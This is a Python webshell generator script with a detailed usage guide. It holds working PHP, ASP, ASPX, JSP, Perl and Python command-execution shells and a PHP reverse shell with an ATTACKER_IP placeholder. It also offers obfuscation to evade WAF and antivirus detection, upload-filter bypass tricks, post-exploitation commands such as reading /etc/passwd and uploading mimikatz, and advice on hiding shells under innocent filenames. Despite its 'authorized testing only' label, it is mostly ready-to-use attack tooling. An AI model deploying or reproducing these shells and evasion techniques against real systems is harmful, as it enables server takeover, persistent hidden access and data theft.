#!/usr/bin/env python3
"""
Webshell Generator - Create PHP/ASP/JSP Webshells
For authorized security testing only

QUICK START:
    ./webshell_gen.py --list                    # List available shells
    ./webshell_gen.py -t php -o shell.php       # Generate PHP shell
    ./webshell_gen.py -t php --obfuscate        # Obfuscated shell
"""

import argparse
import sys
import os
import base64
import random
import string
from typing import Dict, Optional

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    E = '\033[0m'
    BOLD = '\033[1m'

# Webshell templates
SHELLS = {
    'php_simple': {
        'name': 'PHP Simple Command',
        'ext': 'php',
        'desc': 'Basic PHP command execution via GET parameter',
        'code': '''<?php
// Simple PHP Webshell - For authorized testing only
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>''',
        'usage': 'shell.php?cmd=whoami'
    },

    'php_system': {
        'name': 'PHP System Shell',
        'ext': 'php',
        'desc': 'PHP shell using system() function',
        'code': '''<?php
// PHP System Shell - For authorized testing only
if(isset($_GET['c'])){
    system($_GET['c']);
}
?>''',
        'usage': 'shell.php?c=id'
    },

    'php_passthru': {
        'name': 'PHP Passthru Shell',
        'ext': 'php',
        'desc': 'PHP shell using passthru() - raw output',
        'code': '''<?php
// PHP Passthru Shell - For authorized testing only
if(isset($_GET['x'])){
    passthru($_GET['x']);
}
?>''',
        'usage': 'shell.php?x=ls -la'
    },

    'php_eval': {
        'name': 'PHP Eval Shell',
        'ext': 'php',
        'desc': 'PHP shell that evaluates arbitrary PHP code',
        'code': '''<?php
// PHP Eval Shell - For authorized testing only
if(isset($_POST['code'])){
    eval($_POST['code']);
}
?>''',
        'usage': 'POST code=phpinfo();'
    },

    'php_full': {
        'name': 'PHP Full Featured',
        'ext': 'php',
        'desc': 'Full-featured shell with file manager, command exec',
        'code': '''<?php
// Full PHP Shell - For authorized testing only
error_reporting(0);
$auth = "test"; // Change this password

if(!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!=$auth){
    header('WWW-Authenticate: Basic realm="Auth"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

$cwd = getcwd();
if(isset($_GET['cd'])) { chdir($_GET['cd']); $cwd = getcwd(); }

echo "<html><head><title>Shell</title>";
echo "<style>body{background:#1a1a2e;color:#0f0;font-family:monospace;}</style></head><body>";
echo "<h2>PWD: $cwd</h2>";

// Command execution
if(isset($_POST['cmd'])){
    echo "<pre>" . htmlspecialchars(shell_exec($_POST['cmd'] . " 2>&1")) . "</pre>";
}

// File listing
echo "<h3>Files:</h3><ul>";
foreach(scandir($cwd) as $f){
    if($f!='.' && $f!='..'){
        $full = $cwd.'/'.$f;
        if(is_dir($full)){
            echo "<li><a href='?cd=$full'>[$f]</a></li>";
        } else {
            echo "<li>$f (".filesize($full)." bytes)</li>";
        }
    }
}
echo "</ul>";

// Command form
echo "<form method='post'><input name='cmd' style='width:80%;background:#000;color:#0f0;border:1px solid #0f0;'>";
echo "<input type='submit' value='Run' style='background:#0f0;color:#000;'></form>";
echo "</body></html>";
?>''',
        'usage': 'HTTP Basic Auth then command form'
    },

    'php_upload': {
        'name': 'PHP File Uploader',
        'ext': 'php',
        'desc': 'Simple file upload shell',
        'code': '''<?php
// PHP File Upload Shell - For authorized testing only
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], basename($_FILES['f']['name']));
    echo "Uploaded: " . $_FILES['f']['name'];
}
?>
<form method="post" enctype="multipart/form-data">
<input type="file" name="f"><input type="submit" value="Upload">
</form>''',
        'usage': 'Upload via form'
    },

    'php_reverse': {
        'name': 'PHP Reverse Shell Connect',
        'ext': 'php',
        'desc': 'PHP reverse shell (requires IP/port setup)',
        'code': '''<?php
// PHP Reverse Shell - For authorized testing only
// CHANGE THESE: $ip = "ATTACKER_IP"; $port = 4444;
$ip = "127.0.0.1";
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>''',
        'usage': 'Edit IP/port, then access shell.php'
    },

    'asp_cmd': {
        'name': 'ASP Command Shell',
        'ext': 'asp',
        'desc': 'Classic ASP command execution',
        'code': '''<%
' ASP Command Shell - For authorized testing only
If Request("cmd") <> "" Then
    Set oShell = Server.CreateObject("WScript.Shell")
    Set oExec = oShell.Exec("cmd.exe /c " & Request("cmd"))
    Response.Write "<pre>" & oExec.StdOut.ReadAll & "</pre>"
End If
%>
<form method="GET">
<input name="cmd" style="width:80%"><input type="submit" value="Run">
</form>''',
        'usage': 'shell.asp?cmd=dir'
    },

    'aspx_cmd': {
        'name': 'ASPX Command Shell',
        'ext': 'aspx',
        'desc': 'ASP.NET command execution',
        'code': '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<!-- ASPX Command Shell - For authorized testing only -->
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    if(Request["cmd"] != null) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + Request["cmd"];
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<form method="GET">
<input name="cmd" style="width:80%"><input type="submit" value="Run">
</form>''',
        'usage': 'shell.aspx?cmd=whoami'
    },

    'jsp_cmd': {
        'name': 'JSP Command Shell',
        'ext': 'jsp',
        'desc': 'Java JSP command execution',
        'code': '''<%@ page import="java.io.*" %>
<!-- JSP Command Shell - For authorized testing only -->
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.print("<pre>");
    while((line = br.readLine()) != null) {
        out.println(line);
    }
    out.print("</pre>");
}
%>
<form method="GET">
<input name="cmd" style="width:80%"><input type="submit" value="Run">
</form>''',
        'usage': 'shell.jsp?cmd=id'
    },

    'perl_cmd': {
        'name': 'Perl CGI Shell',
        'ext': 'pl',
        'desc': 'Perl CGI command execution',
        'code': '''#!/usr/bin/perl
# Perl CGI Shell - For authorized testing only
use CGI;
print "Content-type: text/html\\n\\n";
my $q = CGI->new;
my $cmd = $q->param('cmd');
if($cmd) {
    print "<pre>" . `$cmd` . "</pre>";
}
print '<form method="GET"><input name="cmd"><input type="submit" value="Run"></form>';
''',
        'usage': 'shell.pl?cmd=whoami'
    },

    'python_cmd': {
        'name': 'Python CGI Shell',
        'ext': 'py',
        'desc': 'Python CGI command execution',
        'code': '''#!/usr/bin/env python3
# Python CGI Shell - For authorized testing only
import cgi
import subprocess
import html

print("Content-type: text/html\\n")

form = cgi.FieldStorage()
cmd = form.getvalue('cmd')

if cmd:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(f"<pre>{html.escape(result.stdout)}{html.escape(result.stderr)}</pre>")

print('<form method="GET"><input name="cmd"><input type="submit" value="Run"></form>')
''',
        'usage': 'shell.py?cmd=id'
    },
}

HELP_TEXT = """
================================================================================
                    WEBSHELL GENERATOR - COMPREHENSIVE GUIDE
                    Post-Exploitation Web Access
================================================================================

WHAT IS A WEBSHELL?
-------------------
A webshell is a script that runs on a web server and gives you command-line
access through HTTP requests. After uploading a webshell, you can execute
system commands by visiting the shell's URL in your browser or with curl.

EXAMPLE FLOW:
  1. Find file upload vulnerability on target.com
  2. Upload shell.php to target.com/uploads/shell.php
  3. Visit: target.com/uploads/shell.php?cmd=whoami
  4. Server executes "whoami" and returns the result

WHY THIS MATTERS: Webshells turn a file upload vulnerability into full
command execution. They're persistent (survive until deleted), accessible
remotely, and don't require maintaining a connection like a reverse shell.


WHEN TO USE WEBSHELLS VS REVERSE SHELLS
---------------------------------------

USE WEBSHELL WHEN:
  - You found a file upload vulnerability
  - Target has outbound firewall blocking reverse shells
  - You need persistent access that survives reboots
  - You want to access the compromised server later
  - Interactive shell isn't needed (just running commands)

USE REVERSE SHELL WHEN:
  - You need interactive terminal access
  - File upload isn't available
  - You have command injection but no file write
  - You need to transfer files interactively
  - Target has web application firewall blocking webshell behavior


CHOOSING THE RIGHT SHELL TYPE
-----------------------------

PHP SHELLS (Most Common)
  Use when: Apache, Nginx with PHP, LAMP/LEMP stack, WordPress, etc.
  File extension: .php, .phtml, .php5, .pHp, .phps
  Functions: shell_exec, system, passthru, exec, proc_open

  php_simple - Basic shell, uses shell_exec
    BEST FOR: Quick access, testing
    REQUEST:  GET shell.php?cmd=whoami

  php_system - Uses system() function
    BEST FOR: When shell_exec is disabled
    REQUEST:  GET shell.php?c=id

  php_passthru - Uses passthru() for raw output
    BEST FOR: Binary output, large responses
    REQUEST:  GET shell.php?x=ls -la

  php_eval - Executes arbitrary PHP code
    BEST FOR: More complex operations
    REQUEST:  POST code=system('whoami');

  php_full - Full featured with file browser
    BEST FOR: Extended access, file operations
    FEATURE:  Web-based file browser + command execution

  php_upload - File uploader
    BEST FOR: Second stage, uploading additional tools
    FEATURE:  HTML form for file uploads

  php_reverse - Reverse shell connector
    BEST FOR: Breaking out of web context
    REQUIRES: Edit IP/port, listener on your machine


ASP/ASPX SHELLS (Windows IIS)
  Use when: Windows Server, IIS, .NET applications
  File extension: .asp, .aspx, .ashx

  asp_cmd - Classic ASP shell
    BEST FOR: Older Windows servers
    REQUEST:  GET shell.asp?cmd=dir

  aspx_cmd - ASP.NET shell
    BEST FOR: Modern Windows/.NET servers
    REQUEST:  GET shell.aspx?cmd=whoami


JSP SHELLS (Java Servers)
  Use when: Tomcat, JBoss, WebLogic, WebSphere
  File extension: .jsp, .jspx

  jsp_cmd - JSP command shell
    BEST FOR: Java application servers
    REQUEST:  GET shell.jsp?cmd=id


CGI SHELLS (Legacy/Unix)
  Use when: CGI-bin enabled, older servers

  perl_cmd - Perl CGI shell
  python_cmd - Python CGI shell


BYPASSING UPLOAD FILTERS
------------------------

EXTENSION BYPASS:
  Blocked: .php
  Try: .phtml, .php5, .php7, .phar, .phps, .pHp, .PHP, .pHp5

DOUBLE EXTENSION:
  shell.php.jpg - Some servers check only final extension
  shell.php.xxx - Unknown extension might get processed as PHP

NULL BYTE (Older PHP < 5.3.4):
  shell.php%00.jpg - Null byte terminates filename early

CONTENT-TYPE MANIPULATION:
  Upload as image/jpeg but with .php extension
  Some filters only check Content-Type header

ADD IMAGE HEADER:
  Prepend GIF89a; to shell content
  File looks like image to basic checks:
    GIF89a;<?php system($_GET['cmd']); ?>

CASE SENSITIVITY:
  .pHp, .PhP, .PHP on case-insensitive systems


OBFUSCATION TECHNIQUES
----------------------

WHY OBFUSCATE:
  - Bypass WAF (Web Application Firewall) detection
  - Evade antivirus on upload
  - Avoid pattern-based filters

WHAT --obfuscate DOES:
  - Breaks up dangerous function names: "s"."h"."e"."l"."l"."_"."e"."x"."e"."c"
  - Uses chr() to hide keywords: chr(115).chr(121).chr(115) = "sys"
  - Randomizes variable names
  - Basic but effective against simple filters


SCENARIO-BASED USAGE
--------------------

SCENARIO: Found file upload on PHP site
COMMAND:  ./webshell_gen.py -t php_simple -o shell.php
WHY:      Simple shell, quick access
NEXT:     Upload shell.php
          Access: http://target.com/uploads/shell.php?cmd=id
          Verify execution, then enumerate system


SCENARIO: Upload filter blocking PHP
COMMAND:  ./webshell_gen.py -t php_simple --obfuscate -o shell.phtml
WHY:      Obfuscation may bypass content filters
          .phtml is alternate PHP extension
NEXT:     Try different extensions until one works
          Try adding GIF89a; header manually


SCENARIO: Need persistent access with file operations
COMMAND:  ./webshell_gen.py -t php_full --password "secretpass" -o admin.php
WHY:      Full shell has file browser
          Password protects from other attackers
NEXT:     Upload and access with ?p=secretpass
          Browse files, run commands, download data


SCENARIO: Windows IIS server identified
COMMAND:  ./webshell_gen.py -t aspx_cmd -o shell.aspx
WHY:      ASPX works on IIS with .NET
          ASP shells for older servers
NEXT:     Upload to writable directory
          Commands: whoami, dir, type C:\\file.txt


SCENARIO: Need to upload additional tools
COMMAND:  ./webshell_gen.py -t php_upload -o up.php
WHY:      Upload form for additional files
          Can upload netcat, mimikatz, etc.
NEXT:     Upload larger tools through the uploader
          Then execute them via command shell


POST-EXPLOITATION COMMANDS
--------------------------
After webshell is working, run these to understand the system:

LINUX:
  whoami                 - Current user
  id                     - User ID and groups
  uname -a               - Kernel version
  cat /etc/passwd        - User list
  pwd                    - Current directory
  ls -la                 - Directory listing
  cat /etc/crontab       - Scheduled tasks
  netstat -tulpn         - Network connections
  ps aux                 - Running processes
  find / -perm -4000     - SUID binaries (privesc)

WINDOWS:
  whoami                 - Current user
  whoami /priv           - Privileges
  systeminfo             - System information
  net user               - User list
  net localgroup         - Local groups
  dir C:\\               - Directory listing
  type C:\\file.txt      - Read file
  netstat -ano           - Network connections
  tasklist               - Running processes


COMMON MISTAKES TO AVOID
------------------------
1. Forgetting to clean up shells after testing
2. Using predictable names (shell.php, c99.php, r57.php)
3. Not password-protecting shells (other attackers can use it)
4. Running noisy commands that trigger alerts
5. Not checking if dangerous functions are disabled


PHP FUNCTION DISABLED?
----------------------
If one function doesn't work, PHP might have it disabled.
Check with: phpinfo(); or <?php echo ini_get('disable_functions'); ?>

Then try alternatives:
  shell_exec disabled → try system()
  system disabled → try passthru()
  passthru disabled → try exec()
  exec disabled → try proc_open()
  All disabled → try PHP streams, mail(), etc.


COMMAND REFERENCE
-----------------
GENERATE:
  -t, --type TYPE        Shell type (see --list)
  -o, --output FILE      Save to file

MODIFICATIONS:
  --obfuscate            Apply basic obfuscation (PHP only)
  --password PASS        Add password protection (PHP only)
  --base64               Output as base64 encoded

INFO:
  --list                 List all available shell types

SHELL TYPES:
  php_simple             Basic PHP shell
  php_system             PHP system() shell
  php_passthru           PHP passthru() shell
  php_eval               PHP code execution
  php_full               Full-featured PHP shell
  php_upload             PHP file uploader
  php_reverse            PHP reverse shell
  asp_cmd                Classic ASP shell
  aspx_cmd               ASP.NET shell
  jsp_cmd                JSP shell
  perl_cmd               Perl CGI shell
  python_cmd             Python CGI shell


OPERATIONAL SECURITY
--------------------
1. Use innocent filenames: config.php, error.php, wp-config-backup.php
2. Put shells in deep directories that aren't regularly checked
3. Add password protection so only you can use it
4. Clean up shells after engagement
5. Be aware shells leave logs in web server access logs
================================================================================
"""

def banner():
    print(f"""{C.C}
 _    __     __       __       ____
| |  / /__  / /_  ___/ /_  ___/ / /
| | /| / / _ \/ __ \(__  ) __ \/ _ \/ / /
| |/ |/ /  __/ /_/ / / _/ / / /  __/ / /
|__/|__/\___/_.___/ /_//_/ /_/\___/_/_/
{C.E}{C.Y}Webshell Generator{C.E}
""")

def random_string(length: int = 8) -> str:
    """Generate random string"""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def obfuscate_php(code: str) -> str:
    """Basic PHP obfuscation"""
    # Replace function names with alternatives
    obfuscated = code

    # Variable name randomization
    var_name = random_string(6)

    # Base64 encode the command execution part
    if 'shell_exec' in code:
        obfuscated = f'''<?php
// Obfuscated Shell
${"_".join(random_string(3) for _ in range(3))} = "s"."h"."e"."l"."l"."_"."e"."x"."e"."c";
${var_name} = ${"_".join(random_string(3) for _ in range(3))};
if(isset($_REQUEST["cmd"])){{
    echo "<pre>" . ${var_name}($_REQUEST["cmd"]) . "</pre>";
}}
?>'''

    elif 'system' in code:
        obfuscated = f'''<?php
// Obfuscated Shell
${random_string(4)} = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
if(isset($_GET["c"])){{
    ${random_string(4)}($_GET["c"]);
}}
?>'''

    return obfuscated

def add_password_protection(code: str, password: str) -> str:
    """Add password protection to shell"""
    if code.startswith('<?php'):
        auth_code = f'''<?php
// Password Protected Shell
$password = "{password}";
if(!isset($_REQUEST["p"]) || $_REQUEST["p"] !== $password){{
    die("Access Denied");
}}
?>
'''
        return auth_code + code[5:]  # Remove <?php from original
    return code

def list_shells():
    """List all available shell types"""
    print(f"\n{C.M}Available Webshells:{C.E}\n")

    for shell_id, shell in SHELLS.items():
        print(f"{C.G}{shell_id:15}{C.E} - {shell['name']}")
        print(f"                  {C.B}Type:{C.E} .{shell['ext']}")
        print(f"                  {C.B}Desc:{C.E} {shell['desc']}")
        print(f"                  {C.B}Usage:{C.E} {shell['usage']}")
        print()

def generate_shell(shell_type: str, output: str = None,
                   obfuscate: bool = False, encode_b64: bool = False,
                   password: str = None) -> Optional[str]:
    """Generate webshell"""

    if shell_type not in SHELLS:
        print(f"{C.R}[!]{C.E} Unknown shell type: {shell_type}")
        print(f"{C.Y}[*]{C.E} Use --list to see available types")
        return None

    shell = SHELLS[shell_type]
    code = shell['code']

    # Apply obfuscation
    if obfuscate and shell['ext'] == 'php':
        print(f"{C.B}[*]{C.E} Applying obfuscation...")
        code = obfuscate_php(code)

    # Add password protection
    if password and shell['ext'] == 'php':
        print(f"{C.B}[*]{C.E} Adding password protection...")
        code = add_password_protection(code, password)

    # Base64 encode
    if encode_b64:
        code = base64.b64encode(code.encode()).decode()
        print(f"{C.B}[*]{C.E} Base64 encoded")

    # Output
    if output:
        with open(output, 'w') as f:
            f.write(code)
        print(f"{C.G}[+]{C.E} Shell saved to: {C.Y}{output}{C.E}")
        print(f"{C.B}[*]{C.E} Usage: {shell['usage']}")
        if password:
            print(f"{C.B}[*]{C.E} Password parameter: p={password}")
    else:
        print(f"\n{C.M}=== {shell['name']} ==={C.E}\n")
        print(code)
        print(f"\n{C.B}[*]{C.E} Usage: {shell['usage']}")

    return code

def main():
    parser = argparse.ArgumentParser(
        description='Webshell Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='For authorized security testing only.'
    )

    parser.add_argument('-t', '--type', help='Shell type')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--obfuscate', action='store_true', help='Obfuscate shell')
    parser.add_argument('--base64', action='store_true', help='Base64 encode output')
    parser.add_argument('--password', help='Add password protection')
    parser.add_argument('--list', action='store_true', help='List available shells')
    parser.add_argument('--help-full', action='store_true', help='Show detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    banner()

    if args.list:
        list_shells()
        return

    if not args.type:
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --list to see available shell types")
        print(f"{C.Y}Tip:{C.E} Use --help-full for detailed guide")
        return

    generate_shell(
        args.type,
        output=args.output,
        obfuscate=args.obfuscate,
        encode_b64=args.base64,
        password=args.password
    )

if __name__ == '__main__':
    main()
